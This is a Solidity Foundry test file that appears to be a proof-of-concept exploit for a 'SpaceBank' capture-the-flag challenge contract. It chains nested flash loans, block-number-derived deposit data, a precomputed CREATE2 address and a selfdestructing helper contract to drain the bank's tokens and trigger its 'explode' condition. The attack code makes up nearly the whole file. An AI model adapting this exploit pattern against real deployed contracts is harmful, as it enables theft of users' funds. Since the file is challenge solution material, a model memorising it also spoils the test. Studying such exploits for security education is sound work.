// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {SpaceBank,SpaceToken } from "src/SpaceBank.sol";

contract SpaceBank_POC is Test {
    SpaceBank _spacebank;
    SpaceToken _spacetoken;
    bytes creationCode = type(ethsend).creationCode;
    function init() private{
        vm.startPrank(address(0x10));
        _spacetoken = new SpaceToken();
        _spacebank = new SpaceBank(address(_spacetoken));
        _spacetoken.mint(address(_spacebank),1000);
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }
    function test_SpaceBank_POC() public{
        _spacetoken.approve(address(_spacebank), 1000);
        _spacebank.flashLoan(600, address(this));
        _spacebank.flashLoan(400, address(this));
        _spacebank.withdraw(1000);
        vm.roll(block.number+2);
        _spacebank.explodeSpaceBank();
        console.log("Success",_spacebank.exploded());

    }

    function getaddress() public returns (address) {
        bytes32 salt = bytes32(block.number);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), _spacebank, salt, keccak256(creationCode)));

        return address(uint160(uint256(hash)));
    }

    function executeFlashLoan(uint256 amount) external {
        if(amount==600){
            uint256 result = block.number % 47;
            bytes memory data = abi.encode(result);
            _spacebank.deposit(amount, data);
        }
        if(amount==400){
            payable(address(getaddress())).transfer(1); //Note the attacker contract should have eth for this to work
            bytes memory data = creationCode;
            _spacebank.deposit(amount, data);
        }   
    }
        
}

contract ethsend {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
